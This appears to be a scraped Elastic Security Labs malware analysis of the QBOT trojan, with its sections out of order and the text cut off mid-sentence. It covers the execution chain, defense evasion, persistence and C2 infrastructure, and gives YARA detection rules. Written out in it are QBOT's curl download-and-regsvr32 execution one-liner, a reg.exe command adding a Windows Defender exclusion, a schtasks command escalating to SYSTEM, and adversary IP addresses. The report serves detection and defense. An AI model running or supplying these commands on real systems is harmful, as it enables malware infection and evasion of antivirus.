<p class="mb-6">To do this, we used the ipinfo.io CLI tool. You can <a href="https://ipinfo.io/signup" class="font-medium underline underline-offset-3">get an API key</a> and download the <a href="https://github.com/ipinfo/cli" class="font-medium underline underline-offset-3">tool for free</a>.</p>
<p class="mb-6">To start, we collected our list of 138 IP addresses and then sent them through the ipinfo CLI tool as a bulk job, and output results as JSON into a file called <strong>qbot.json</strong>.</p>
<pre><div class="relative mb-6 w-full max-w-full overflow-hidden"><pre class="w-full max-w-full overflow-x-auto p-4"><code class="font-mono text-sm whitespace-pre">$ ipinfo bulk &gt; qbot.json
** manual input mode **
Enter all IPs, one per line:
140.82.49.12
144.202.2.175
144.202.3.39
149.28.238.199
45.63.1.12
45.76.167.26
…truncated…

<p class="mb-6">Next, we need to change this into to a newline-delimited JSON (NDJSON) file so that we can quickly upload it into Elasticsearch for analysis. To do this, we can use the tool <a href="https://stedolan.github.io/jq/" class="font-medium underline underline-offset-3">Jquery</a>, a command-line JSON processor.</p>
<pre><div class="relative mb-6 w-full max-w-full overflow-hidden"><pre class="w-full max-w-full overflow-x-auto p-4"><code class="font-mono text-sm whitespace-pre">$ cat qbot.json | jq -c &#x27;.[]&#x27; &gt; qbot.ndjson

{&quot;ip&quot;:&quot;140.82.49.12&quot;,&quot;hostname&quot;:&quot;140.82.49.12.vultrusercontent.com&quot;,&quot;city&quot;:&quot;San Jose&quot;,&quot;region&quot;:&quot;California&quot;,&quot;country&quot;:&quot;US&quot;,&quot;country_name&quot;:&quot;United States&quot;,&quot;loc&quot;:&quot;37.3394,-121.8950&quot;,&quot;org&quot;:&quot;AS20473 The Constant Company, LLC&quot;,&quot;postal&quot;:&quot;95103&quot;,&quot;timezone&quot;:&quot;America/Los_Angeles&quot;}
{&quot;ip&quot;:&quot;144.202.2.175&quot;,&quot;hostname&quot;:&quot;144.202.2.175.vultrusercontent.com&quot;,&quot;city&quot;:&quot;New York City&quot;,&quot;region&quot;:&quot;New York&quot;,&quot;country&quot;:&quot;US&quot;,&quot;country_name&quot;:&quot;United States&quot;,&quot;loc&quot;:&quot;40.7143,-74.0060&quot;,&quot;org&quot;:&quot;AS20473 The Constant Company, LLC&quot;,&quot;postal&quot;:&quot;10004&quot;,&quot;timezone&quot;:&quot;America/New_York&quot;}
…truncated…</code></pre><button title="Copy code block" class="absolute top-1 right-1 z-10 cursor-pointer bg-surface-subtlest p-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-5"><path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125  1.125 0 0 1-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 0 1 1.5.124m7.5 10.376h3.375c.621 0  1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 0 0-1.5-.124H9.375c-.621 0-1.125.504-1.125  1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 0 1-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 0 0-3.375-3.375h-1.5a1.125  1.125 0 0 1-1.125-1.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H9.75"></path></svg></button></div></pre>
<p class="mb-6">Now that we have an NDJSON file, we can upload that into Elasticsearch through Kibana (or with Filebeat or the Elastic Agent). To do this, we’ll use the <a href="https://github.com/peasead/elastic-container" class="font-medium underline underline-offset-3">Elastic Container Project</a> to spin up an entire Elastic Stack in Docker to do our analysis.</p>
<p class="mb-6">Once the containers have spun up, navigate to the Data Visualizer from within the Machine Learning menu. Select the NDJSON file that you created previously, and click the blue Import button.</p>
<p class="mb-6">Provide an index name and then click on the Advanced tab. Under the Mappings settings, change <strong>loc</strong> to <strong>geo_point</strong> and then click the blue Import button.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rrllltnl6:"><img alt="Set &quot;loc&quot; to &quot;geo_point&quot;" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltabca94c1b6009355/6a7c82373ce8e2239dcef70d/data_visualizer_geo_point.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">Set &quot;loc&quot; to &quot;geo_point&quot;</span></p>
<p class="mb-6">Now that we have the data loaded into Elasticsearch, you can do additional analysis, such as creating a <a href="https://www.elastic.co/guide/en/kibana/current/maps.html" class="font-medium underline underline-offset-3">map visualization</a>.</p>
<p class="mb-6">When looking at the distribution of network entities, we see them spread across the globe with most of them belonging to a variety of Internet service providers.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rrmdltnl6:"><img alt="Map of all identified network infrastructure" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt6f9909bb0629e8f8/6a7c823a4c4bfb4045cc78cc/network_all_ips.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">Map of all identified network infrastructure</span></p>
<p class="mb-6">A caveat to the ISP-owned addresses, we did observe 7 IP addresses owned by Vultr. Vultr is a legitimate cloud hosting provider and is also a favorite among adversaries because of the ability to upload custom ISO files that allow for a protected command &amp; control server.</p>
<p class="mb-6"><button type="button" class="inline-block border-0 bg-transparent p-0 text-inherit focus-visible:outline-none" tabindex="0" data-base-ui-click-trigger="" id="base-ui-:Rrmtltnl6:"><img alt="Network infrastructure node information" src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt6a8ea8d9b4bdd67b/6a7c823ce02fac4ad05d04ef/network_vultr.jpg" class="block h-auto max-w-full cursor-zoom-in focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-current focus-visible:ring-offset-2 w-full"/></button><span class="mt-4 block text-center text-sm text-subtler italic">Network infrastructure node information</span></p>
<h2 id="qbot-configuration-extractor" class="mb-4 scroll-mt-[120px] text-4xl [&amp;:not(:first-child)]:mt-7">QBOT Configuration Extractor</h2>
<p class="mb-6">Collecting elements of malware events is a valuable analysis skill that can assist in the identification of additional compromised hosts in a contested environment.</p>
<p class="mb-6">Elastic Security Labs has released an open source tool, under the Apache 2.0 license, that will allow for configurations to be extracted from QBOT samples. The tool can be downloaded <a href="https://www.elastic.co/security-labs/qbot-configuration-extractor" class="font-medium underline underline-offset-3">here</a>.</p>
<pre><div class="relative mb-6 w-full max-w-full overflow-hidden"><pre class="w-full max-w-full overflow-x-auto p-4"><code class="font-mono text-sm whitespace-pre">$ qbot-config-extractor -f c2ba065654f13612ae63bca7f972ea91c6fe97291caeaaa3a28a180fb1912b3a

<p class="mb-6">We have asked Vultr to review our QBOT research and take appropriate actions in accordance with their customer Use Policy, but have not received a response as of publication.</p>
<h2 id="observed-adversary-tactics-and-techniques" class="mb-4 scroll-mt-[120px] text-4xl [&amp;:not(:first-child)]:mt-7">Observed Adversary Tactics and Techniques</h2>
<h3 id="tactics" class="mb-4 scroll-mt-[120px] text-3xl [&amp;:not(:first-child)]:mt-7">Tactics</h3>
<p class="mb-6">Using the MITRE ATT&amp;CK® framework, tactics represent the why of a technique or sub-technique. It is the adversary’s tactical goal: the reason for performing an action.</p>
<ul class="mb-6 pl-6 [&amp;&gt;li]:list-disc">
<li class="text-subtler mb-4"><a href="https://attack.mitre.org/tactics/TA0002" class="font-medium underline underline-offset-3">Execution</a></li>
<li class="text-subtler mb-4"><a href="https://attack.mitre.org/tactics/TA0003" class="font-medium underline underline-offset-3">Persistence</a></li>
<li class="text-subtler mb-4"><a href="https://attack.mitre.org/tactics/TA0004" class="font-medium underline underline-offset-3">Privilege Escalation</a></li>
<li class="text-subtler mb-4"><a href="https://attack.mitre.org/tactics/TA0005" class="font-medium underline underline-offset-3">Defense Evasion</a></li>
<li class="text-subtler mb-4"><a href="https://attack.mitre.org/tactics/TA0011" class="font-medium underline underline-offset-3">Command and Control</a></li>
</ul>
<h3 id="techniques-/-sub-techniques" class="mb-4 scroll-mt-[120px] text-3xl [&amp;:not(:first-child)]:mt-7">Techniques / Sub Techniques</h3>
<p class="mb-6">Techniques and Sub techniques represent how an adversary achieves a tactical goal by performing an action.</p>
<ul class="mb-6 pl-6 [&amp;&gt;li]:list-disc">
<li class="text-subtler mb-4"><a href="https://attack.mitre.org/techniques/T1059/003" class="font-medium underline underline-offset-3">Command and Scripting Interpreter: Windows Command Shell</a></li>
<li class="text-subtler mb-4"><a href="https://attack.mitre.org/techniques/T1053/005" class="font-medium underline underline-offset-3">Scheduled Task/Job: Scheduled Task</a></li>
<li class="text-subtler mb-4"><a href="https://attack.mitre.org/techniques/T1547/001" class="font-medium underline underline-offset-3">Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder</a></li>
<li class="text-subtler mb-4"><a href="https://attack.mitre.org/techniques/T1078/001" class="font-medium underline underline-offset-3">Valid Accounts: Default Accounts</a></li>
<li class="text-subtler mb-4"><a href="https://attack.mitre.org/techniques/T1105" class="font-medium underline underline-offset-3">Ingress Tool Transfer</a></li>
<li class="text-subtler mb-4"><a href="https://attack.mitre.org/techniques/T1071/001" class="font-medium underline underline-offset-3">Application Layer Protocol: Web Protocols</a></li>
<li class="text-subtler mb-4"><a href="https://attack.mitre.org/techniques/T1070/004" class="font-medium underline underline-offset-3">Indicator Removal on Host: File Deletion</a></li>
</ul>
<h2 id="detections" class="mb-4 scroll-mt-[120px] text-4xl [&amp;:not(:first-child)]:mt-7">Detections</h2>
<p class="mb-6">The following detection rules and behavior prevention events were observed throughout the analysis of the QBOT sample.</p>
<ul class="mb-6 pl-6 [&amp;&gt;li]:list-disc">
<li class="text-subtler mb-4"><a href="https://www.elastic.co/guide/en/security/current/suspicious-execution-via-scheduled-task.html" class="font-medium underline underline-offset-3">Suspicious Execution via Scheduled Task</a></li>
<li class="text-subtler mb-4"><a href="https://www.elastic.co/guide/en/security/current/startup-or-run-key-registry-modification.html" class="font-medium underline underline-offset-3">Startup or Run Key Registry Modification</a></li>
<li class="text-subtler mb-4">Memory Threat Detection Alert: Shellcode Injection</li>
<li class="text-subtler mb-4">Malicious Behavior Detection Alert: Suspicious String Value Written to Registry Run Key</li>
<li class="text-subtler mb-4">Malicious Behavior Detection Alert: Suspicious Scheduled Task Creation</li>
</ul>
<h3 id="yara" class="mb-4 scroll-mt-[120px] text-3xl [&amp;:not(:first-child)]:mt-7">YARA</h3>
<p class="mb-6">Elastic Security has created YARA rules to identify this activity.</p>
<pre><div class="relative mb-6 w-full max-w-full overflow-hidden"><pre class="w-full max-w-full overflow-x-auto p-4"><code class="font-mono text-sm whitespace-pre">rule Windows_Trojan_Qbot_1 {
    meta:
        author = &quot;Elastic Security&quot;
        creation_date = &quot;2021-02-16&quot;
        last_modified = &quot;2021-08-23&quot;
        os = &quot;Windows&quot;
        arch = &quot;x86&quot;
        category_type = &quot;Trojan&quot;
        family = &quot;Qbot&quot;
        threat_name = &quot;Windows.Trojan.Qbot&quot;
        reference_sample = &quot;636e2904276fe33e10cce5a562ded451665b82b24c852cbdb9882f7a54443e02&quot;

    strings:
        $a1 = { 33 C0 59 85 F6 74 2D 83 66 0C 00 40 89 06 6A 20 89 46 04 C7 46 08 08 00 }
        $a2 = { FE 8A 14 06 88 50 FF 8A 54 BC 11 88 10 8A 54 BC 10 88 50 01 47 83 }
    condition:
        any of them
}

rule Windows_Trojan_Qbot_4 {

    strings:
        $a1 = &quot;qbot&quot; wide
        $a2 = &quot;stager_1.obf\\Benign\\mfc&quot; wide
        $a3 = &quot;common.obf\\Benign\\mfc&quot; wide
        $a4 = &quot;%u;%u;%u;&quot;
        $a5 = &quot;%u.%u.%u.%u.%u.%u.%04x&quot;
        $a6 = &quot;%u&amp;%s&amp;%u&quot;
        $get_string1 = { 33 D2 8B ?? 6A 5A 5? F7 ?? 8B ?? 08 8A 04 ?? 8B 55 ?? 8B ?? 10 3A 04 ?? }
        $get_string2 = { 33 D2 8B ?? F7 75 F4 8B 45 08 8A 04 02 32 04 ?? 88 04 ?? ?? 83 ?? 01 }
        $set_key = { 8D 87 00 04 00 00 50 56 E8 ?? ?? ?? ?? 59 8B D0 8B CE E8 }
        $do_computer_use_russian_like_keyboard = { B9 FF 03 00 00 66 23 C1 33 C9 0F B7 F8 66 3B 7C 4D }
        $execute_each_tasks = { 8B 44 0E ?? 85 C0 74 ?? FF D0 EB ?? 6A 00 6A 00 6A 00 FF 74 0E ?? E8 ?? ?? ?? ?? 83 C4 10 }
        $generate_random_alpha_num_string = { 57 E8 ?? ?? ?? ?? 48 50 8D 85 ?? ?? ?? ?? 6A 00 50 E8 ?? ?? ?? ?? 8B 4D ?? 83 C4 10 8A 04 38 88 04 0E 46 83 FE 0C }
        $load_base64_dll_from_file_and_inject_into_targets = { 10 C7 45 F0 50 00 00 00 83 65 E8 00 83 7D F0 0B 73 08 8B 45 F0 89 }
    condition:
        6 of them
}</code></pre><button title="Copy code block" class="absolute top-1 right-1 z-10 cursor-pointer bg-surface-subtlest p-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-5"><path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125  1.125 0 0 1-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 0 1 1.5.124m7.5 10.376h3.375c.621 0  1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 0 0-1.5-.124H9.375c-.621 0-1.125.504-1.125  1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 0 1-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 0 0-3.375-3.375h-1.5a1.125  1.125 0 0 1-1.125-1.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H9.75"></path></svg></button></div></pre>

He retired from the Army National Guard after 20+ years as a Chief Warrant Officer Four, in 2021.\u003c/p\u003e","subtitle_l10n":"","tags":[],"title":"Andrew Pease","twitter_id":"https://twitter.com/andythevariable","updated_at":"2026-06-03T21:41:34.763Z","updated_by":"blt3044324473ef223b70bc674c","publish_details":{"time":"2026-06-22T15:08:04.996Z","user":"blt3044324473ef223b70bc674c","environment":"blt835e2c3b7e9eb7fb","locale":"en-us"}}],"categories":[{"_content_type_uid":"threat_command_category","uid":"blt6cf0f6c1782bf2b1","title":"Threat Intelligence","url":"/security-labs/threat-command/category/threat-intelligence","locale":"en-us","created_by":"blt03b12f5a6591ef8c","updated_by":"blt03b12f5a6591ef8c","created_at":"2026-08-12T12:28:37.048Z","updated_at":"2026-08-14T14:34:48.837Z","ACL":{},"_version":2,"tags":[],"seo":{"canonical_tag":"","do_not_index":false,"nofollow":false,"seo_description_l10n":"","seo_image":null,"seo_title_l10n":""},"title_l10n":"Threat Intelligence","publish_details":{"time":"2026-08-25T08:09:44.714Z","user":"blt03b12f5a6591ef8c","environment":"blt835e2c3b7e9eb7fb","locale":"en-us"}}],"created_at":"2026-08-12T14:25:05.726Z","created_by":"blt03b12f5a6591ef8c","date":"2022-08-22T00:00:00.000Z","main_content":{"markdown_l10n":"## Key Takeaways\n\n- QBOT is a popular, actively developed, and full-featured trojan\n- Adversary-controlled or owned infrastructure has been observed being used by numerous samples\n- The analyzed sample leverages multiple persistence and defense evasion mechanisms\n\n## Preamble\n\nElastic Security Labs has been tracking REF3726, an attack pattern for the QBOT malware family. QBOT, also known as [QAKBOT](https://malpedia.caad.fkie.fraunhofer.de/details/win.qakbot), is a prolific modular trojan that has been active since around 2007. QBOT’s loading mechanism makes it an attractive framework to threat actors and ransomware groups and has led to widespread infections of the family; targeting victims across multiple verticals.\n\nThis research covers:\n\n- Execution chain\n- Defense evasion\n- Persistence mechanisms\n- Privilege escalation\n- Network events\n- QBOT configuration extractor\n- Observed tactics and techniques\n\nThrough this research, from static and dynamic analysis and Elastic telemetry, we uncovered 138 adversary-controlled or owned IP addresses. These IP addresses were linked to our sample and used to identify 339 additional associated malicious files. All artifacts are provided as STIX JSON and Elastic Common Schema (ECS) documents.\n\n\u003e For information on the QBOT configuration extractor and malware analysis, check out our blog posts detailing this:\n\u003e\n\u003e - [QBOT Configuration Extractor](https://www.elastic.co/security-labs/qbot-configuration-extractor)\n\u003e - [QBOT Malware Analysis](https://www.elastic.co/security-labs/qbot-malware-analysis)\n\n## Analysis Environment\n\nWe selected a sample for analysis that we could statically and dynamically analyze. This process is commonly used to enrich both types of analysis. For the dynamic analysis, the sample was detonated on a Windows 10 Enterprise VM running the Elastic Endpoint, the Windows and Network Packet Capture Elastic Agent integrations, and an aggressive endpoint logging policy. All events were shipped to our Elastic Cloud cluster and processed through the Elastic Security App. The Elastic Security Endpoint was configured for Alerting and Eventing only (no Prevention). Alerts were generated from Detection Rules in the Security App and directly from the Elastic Security Endpoint default ruleset.\n\n## Execution Chain\n\nThe following section will describe the observed execution chain for the Qbot malware sample. This includes events from Initial Execution to Defense Evasion to Persistence to Privilege Escalation.\n\n![Full execution chain of the QBOT malware sample](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt5af29f3e529629aa/6a7c820aead8ecb93eba4934/full_process_execution_chain.jpg \"Full execution chain of the QBOT malware sample\")\n\n### Initial Execution\n\nThe initial execution of the QBOT sample was observed in Elastic’s telemetry data (derived from @proxylife’s [published research](https://twitter.com/pr0xylife/status/1539601609730170882?s=20\u0026t=G-XR7ibeOO0nWCWajKWTKw) on QBOT).\n\n```\n**\"C:\\Windows\\System32\\cmd.exe\" /q /c echo 'Ft' \u0026\u0026 ping REDACTED[.]com \u0026\u0026 MD \"\\\\vyr\" \u0026\u0026 curl.exe -o \\\\vyr\\v4QpQt.Nqv.e8xO https://REDACTED[.]net/t8EKnIB/C.png \u0026\u0026 echo \"sxF\" \u0026\u0026 ping REDACTED[.]com \u0026\u0026 regsvr32 \"\\\\vyr\\v4QpQt.Nqv.e8xO\"**\n```\n\nNote, that the domains in the initial execution appear to be adversary-controlled, not adversary-owned; because of this, we are redacting them from our reporting.\n\nThe initial execution command does the following:\n\n- **C:\\Windows\\System32\\cmd.exe** - this executes the Microsoft command interpreter\n- **/q** - this switch of **cmd.exe** is to suppress echo output\n- **/c** - this switch of **cmd.exe** is to pass a specific command string to the command interpreter\n- **echo ‘Ft’** - this prints **‘Ft’** to STDOUT\n- **\u0026\u0026** - if the preceding commands were successful, continue and run the next series of commands\n- **ping REDACTED[.]com** - this performs a network connection test to an external domain using the Ping command\n- **MD “\\\\vyr”** - this creates the **vyr** directory in the root directory ( \\*\\*C:\\*\\* )\n- **curl.exe** - this executes the data transfer tool, cURL\n- **-o \\\\vyr\\v4QpQt.Nqv.e8xO `https://REDACTED[.]net/t8EKnIB/C.png`** - using the cURL tool, download and save the **C.png** file, from **REDACTED[.]net**, to the **vyr** directory with a filename of **v4QpQt.Nqv.e8xO**\n- **echo \"sxF\"** - this prints **“sxF”** to STDOUT\n- **regsvr32 \"\\\\vyr\\v4QpQt.Nqv.e8xO\"** - uses the Microsoft Register Server ( **regsvr32** ) to execute **v4QpQt.Nqv.e8xO**\n\nThe infection was prevented by Elastic Endpoint Security, so while the customer was protected, it stopped our ability to monitor the next steps in the infection. To continue the analysis, we manually detonated the sample in our sandbox.\n\n### Manually Advancing Execution\n\nThis manual detonation picked up where Elastic Endpoint Security stopped the initial execution outlined above.\n\nTo allow the infection to continue, the sample was downloaded to our victim machine and executed manually using the [Microsoft Register Server](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) ( **regsvr32.exe** ). The Register Server is a command-line utility to register and unregister DLLs (and other objects) in the Windows Registry.\n\n```\n**regsvr32 -s c2ba065654f13612ae63bca7f972ea91c6fe97291caeaaa3a28a180fb1912b3a.dll**\n```\n\n- **regsvr32** - this executes the Microsoft Register Server\n- **-s** - this suppresses messages boxes\n\nNow that we have manually executed the Qbot DLL, we can track the execution chain, defense evasion, and persistence techniques using the Elastic Security Solution.\n\nFrom within the Security Solution, we can expand the malware event generated by the Qbot DLL execution and explore the details. While we manually executed the malware and know much of this information, it is still helpful as an analyst when researching live malware events.\n\n![Initial alert in the Kibana Security Solution](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt3746fd0ab4608247/6a7c820dbdcff0a2a8c3d0a0/initial_alert_in_security_solution.jpg \"Initial alert in the Kibana Security Solution\")\n\nFrom here we can click on the “Analyze event” button to launch a timeline as a process tree that will show us how the malware progressed and additional contextually relevant information.\n\n![Viewing the execution chain as a process tree](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt35f0b7b345ee4508/6a7c820f8fc2d012e93e88ee/analyze_event_button.jpg \"Viewing the execution chain as a process tree\")\n\nNow that we’re in the Analyzer view, we can continue to step through the QBOT DLL execution chain.\n\n![Microsoft Registry Server used to execute the QBOT DLL](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt0aac183fc58d20f0/6a7c821273d9bd256c297bee/regsvr32_used_to_execute_dll.jpg \"Microsoft Registry Server used to execute the QBOT DLL\")\n\nThe Microsoft command interpreter was opened, and then the first **regsvr32.exe** process is started from **C:\\Windows\\System32\\.** Next, a child **regsvr32.exe** process is spawned from **C:\\Windows\\SysWOW64\\*\\* with the same command-line arguments. The **SysWOW64\\*\\* folder stores system files used to execute 32-bit processes on a 64-bit Windows operating system. This is expected because the Qbot DLL is a 32-bit file.\n\nOnce the DLL is executed by **regsvr32.exe** , it injects itself into the Explorer process.\n\nNext, an **explorer.exe** process is started then immediately self-injects shellcode. In addition to the shellcode injection, we can see 17 file events, 32 network-based events, and 16 registry events observed. We’ll explore those further in the research.\n\n![QBOT injecting into explorer.exe](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltb21565c5983fc239/6a7c8215da3d0509a1633d99/injects_into_explorer_exe.jpg \"QBOT injecting into explorer.exe\")\n\nBefore proceeding, QBOT performs a check to prevent execution on systems that are using the following default system languages:\n\n- LANG_RUSSIAN (Russia)\n- LANG_BELARUSIAN (Belarus)\n- LANG_KAZAK (Kazakhstan)\n- LANG_ARMENIAN (Armenia)\n- LANG_GEORGIAN (Georgia)\n- LANG_UZBEK (Uzbekistan)\n- LANG_TAJIK (Tajikistan)\n- LANG_TURKMEN (Turkmenistan)\n- LANG_UKRAINIAN (Ukraine)\n- LANG_BOSNIAN (Bosnia)\n- LANG_KYRGYZ (Kyrgyzstan)\n\n![QBOT checking for specified default system languages](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltbb5968d72c9c0f7b/6a7c82183ce8e2bba1cef709/watchdog_keyboard.jpg \"QBOT checking for specified default system languages\")\n\n### Defense Evasion\n\nOnce the initial execution chain was completed, we observed attempts at defense evasion to protect the malware and frustrate adversary eviction.\n\nAs noted above, Elastic Endpoint Security observed 17 file events from the injected **explorer.exe**. One of the 17 events occurred when the DLL copied itself from its current path to **C:\\Users\\[REDACTED]\\AppData\\Roaming\\Microsoft\\Vybgeuye** and named itself **maonyo.dll**. The **maonyo.dll** file is the same file as the original Qbot DLL that was manually executed, verified by the SHA-256 hash.\n\n![Creating of the maonyo.dll file](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt250e324abdfb526f/6a7c821afc63ab2623646f40/maonyo_dll_file_creation.jpg \"Creating of the maonyo.dll file\")\n\nThis defense evasion tactic will allow the QBOT DLL to continue to be executed even if the original file is deleted.\n\nIn addition to creating the **maonyo.dll** file, static malware analysis identified a thread called “watchdog”. The watchdog thread monitors for security instrumentation tools that are stored in a list and compared to running processes.\n\nEvery second, the watchdog thread will check to see if any of the running processes matches anything on the list.\n\nThe processes that are monitored for are common security analysis tools.\n\n![Watchdog monitoring for security tooling](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt192776f67c1d9f13/6a7c821d96b5a6c3db875580/watchdog_processes.jpg \"Watchdog monitoring for security tooling\")\n\nIf any of the monitored processes are observed by the malware, it will proceed with randomly generated IP addresses instead of the hard coded ones in the resources section. If a monitored process is detected, an entry is made to the Windows Registry and the malware does not attempt to connect to the actual network infrastructure.\n\nOf note, the **qak_proxy** process identified in the monitored process list is unknown to us. It is possible that this is for an undisclosed security tool that monitors for QBOT network communications or when QBOT is acting as a proxy (which we did not observe with our sample), but that is speculative in nature.\n\nThe static analysis showed that the malware is able to detect running antivirus by checking the list of running processes against known vendors binaries. Depending on the antivirus processes detected, the malware has different behaviors - as an example, if Windows Defender is detected, it add its persistence folder to the Windows Defender exclusion path.\n\n![Watchdog monitoring for antivirus processes](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltc08d203b42ebc8de/6a7c82202f00b2e98def8e71/watchdog_av_2.jpg \"Watchdog monitoring for antivirus processes\")\n\n![QBOT adding a Windows Defender exclusion path](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt876ebfb773aa5869/6a7c8223fc63ab4121646f44/registry_defender_exclusion.jpg \"QBOT adding a Windows Defender exclusion path\")\n\nThe **reg.exe** command does the following:\n\n- **C:\\Windows\\system32\\reg.exe** - Microsoft Registry editor\n- **ADD HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths** - folder location in the registry for Windows Defender exclusions\n- **/f** - adds the registry entry without prompting for confirmation\n- **/t REG_DWORD** - specifies the type for the registry entry\n- **/v C:\\Users\\[REDACTED]\\AppData\\Roaming\\Microsoft\\Vybgeuye** - specifies the name of the registry entry\n- **/d 0** - specifies the data for the new registry entry\n\n### Persistence\n\nAfter the **maonyo.dll** file is created at the random location, **C:\\Users\\[REDACTED]\\AppData\\Roaming\\Microsoft\\Vybgeuye\\*\\* (see the Defense Evasion section) in our example, the **HKEY_USERS\\S-1-5-21-1047687853-4161697681-4019128061-1002\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\lnkotdhh** and **HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Maonyoeve** Windows Registry paths are created to execute the **maoyno.dll** file every time the user with the SID **S-1-5-21-1047687853-4161697681-4019128061-1002\\*\\* logs onto the infected host. This SID is for the user that we used when detonating the DLL.\n\n\u003e While we did not observe QBOT spreading to other users' SIDs in the Windows Registry during dynamic analysis, static analysis shows that this capability exists.\n\nWe were able to identify the registry path creations using Kibana (see below and in the Defense Evasion section), the security researchers over at Trustwave’s Spider Labs published some [great research](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/decrypting-qakbots-encrypted-registry-keys/) about how to find the location of the created QBOT DLL by decrypting binary data stored at **HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\[random folder]**.\n\n![Logon script added to the Windows Registry](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltcb49bafced621043/6a7c8226bd21986e8e7522a0/registry_logon_script.jpg \"Logon script added to the Windows Registry\")\n\nUsing the [decryption tool](https://github.com/drole/qakbot-registry-decrypt) that Spider Labs released as part of their research, we were able to manually validate what we were seeing in Kibana.\n\n![Decrypting binary data added to the Windows Registry](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltfba0f85c08d87d30/6a7c8229448e4e01365bab6e/registry_decrypt_binary.jpg \"Decrypting binary data added to the Windows Registry\")\n\n### Privilege Escalation\n\nThe privilege escalation mechanism we observed was when the injected **explorer.exe** process spawns **schtasks.exe** and creates a new scheduled task to run as the SYSTEM user.\n\n![Scheduled task creation](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt6119b6f4c13cbb9f/6a7c822c80ee38d83860d14d/scheduled_task.jpg \"Scheduled task creation\")\n\n```\n**C:\\Windows\\system32\\schtasks.exe, /Create, /RU, NT AUTHORITY\\SYSTEM, /tn, ayttpnzc, /tr, regsvr32.exe -s \"c:\\Users\\[REDACTED]\\Desktop\\7611346142\\c2ba065654f13612ae63bca7f972ea91c6fe97291caeaaa3a28a180fb1912b3a.dll\", /SC, ONCE, /Z, /ST, 15:21, /ET, 15:33**\n```\n\nThe initial **schtasks.exe** command does the following:\n\n- **/Create** - creates a scheduled task\n- **/RU** **NT AUTHORITY\\SYSTEM** - sets the username and escalates privilege as the **SYSTEM** user\n- **/tn ayttpnzc** - defines the task name\n- **/tr** **regsvr32.exe -s \"c:\\Users\\[REDACTED]\\Desktop\\7611346142\\c2ba065654f13612ae63bca7f972ea91c6fe97291caeaaa3a28a180fb1912b3a.dll** - specifies the task to run\n- **/sc ONCE** - specifies the schedule frequency - once\n- **/Z** - option that marks the task to be deleted after its execution\n- **/ST 15:21** - specifies the task start time (scheduled to start approximately 2-minutes after the scheduled task was created)\n- **/ET 15:33** - time to end the task if not completed\n\n## Network Events\n\nAs we highlighted in the Preamble, there were 32 observed network events generated by the QBOT DLL. In addition to the 32 events that we observed from the execution, we also identified 106 additional hard-coded IP addresses through static analysis. This provided us with a total of 138 IP addresses from our Qbot sample.\n\nComparing the IP addresses against a corpus of malicious files, we identified 338 additional samples communicating with the same network infrastructure.\n\n![Network infrastructure observed in multiple samples](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt04fe119d9beb4064/6a7c822f437e0f9e01dd55d3/network_events.jpg \"Network infrastructure observed in multiple samples\")\n\nWhen looking at the distribution of network and malware data points, not all of the samples are related to QBOT. Most of the Win32DLL files are QBOT related, most of the Win32EXE files are associated with the [EMOTET malware family](https://malpedia.caad.fkie.fraunhofer.de/details/win.emotet), and the Microsoft Office samples are related to generic malspam 